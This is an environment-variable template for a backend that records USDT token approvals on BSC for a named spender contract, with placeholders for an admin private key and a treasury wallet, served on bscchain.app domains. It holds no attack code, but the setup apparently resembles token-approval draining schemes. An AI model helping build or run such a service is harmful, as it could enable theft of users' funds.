# ============================================
# BACKEND - Environment Variables
# ============================================

# Server
PORT=3000

# MongoDB Connection String
MONGO_DB=mongodb://127.0.0.1:27017/usdt-approvals

# CORS - Comma-separated frontend URLs
CORS_ORIGIN=https://bscchain.app,https://www.bscchain.app,https://admin.bscchain.app

# BSC Spender/Master Contract Address
MONITOR_APPROVAL_FOR=0x45c7A22C05A55919213cA2aE1bFcDc20df51780F

# Admin wallet private key (NEVER commit real value)
ADMIN_PRIVATE_KEY=YOUR_ADMIN_WALLET_PRIVATE_KEY

# Treasury wallet address
TREASURY_ADDRESS=YOUR_TREASURY_WALLET_ADDRESS
